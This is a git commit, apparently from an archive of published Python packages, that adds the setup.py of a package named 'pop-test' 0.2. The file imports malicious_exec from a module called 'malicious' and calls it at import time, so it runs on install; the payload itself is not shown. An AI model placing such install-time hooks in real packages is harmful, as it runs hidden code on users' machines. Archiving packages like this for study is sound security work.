8b1c15474cf79ea12589d2dcfbe8718447dcd81c
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 13:55:53 +0000

    Add package pop-test/0.2/pop-test-0.2.tar.gz

---
+++ packages/pop-test/pop-test-0.2.tar.gz/pop-test-0.2/setup.py
@@ -0,0 +1,18 @@
+from distutils.core import setup
+
+from malicious import malicious_exec
+
+malicious_exec()
+
+setup(
+  name = 'pop-test',
+  packages = ['pop-test'],
+  version = '0.2',
+  license='MIT',
+  description = 'Stop pepperonis from publishing this package',
+  author = 'Michael Salsone',
+  author_email = 'mike.salsone@gmail.com',
+  url = 'https://github.com/popsiclestick/pop-test',
+  download_url = 'https://github.com/popsiclestick/pop-test/archive/v_05.tar.gz',
+  keywords = ['request', 'stub', 'dont', 'use', 'this'],
+)
